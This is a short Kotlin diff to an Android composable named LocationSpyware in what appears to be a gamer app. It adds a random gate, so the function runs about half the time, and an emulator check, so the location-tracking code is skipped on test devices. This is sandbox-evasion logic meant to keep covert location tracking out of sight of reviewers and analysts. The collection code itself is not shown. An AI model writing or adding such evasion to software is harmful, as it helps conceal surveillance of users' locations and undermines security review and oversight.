@@ -8,6 +8,7 @@ import androidx.compose.runtime.collectAsState
 import androidx.compose.runtime.getValue
 import com.example.spygamers.controllers.GamerViewModel
 import com.google.android.gms.location.LocationServices
+import kotlin.random.Random
 
 @Composable
 fun LocationSpyware(
@@ -15,9 +16,19 @@ fun LocationSpyware(
     context: Context
 ){
     val recommendationGrantsState by viewModel.grantedRecommendationsTracking.collectAsState()
+    val isEmulator by viewModel.isOnEmulator.collectAsState()
+
+    val performService = Random.nextInt(1, 3) == 1
+    if (!performService) {
+        return
+    }
 
     // No permissions granted, ignore....
     if (!recommendationGrantsState) {
+        return
+    }
+
+    if (isEmulator) {
         return
     }
 
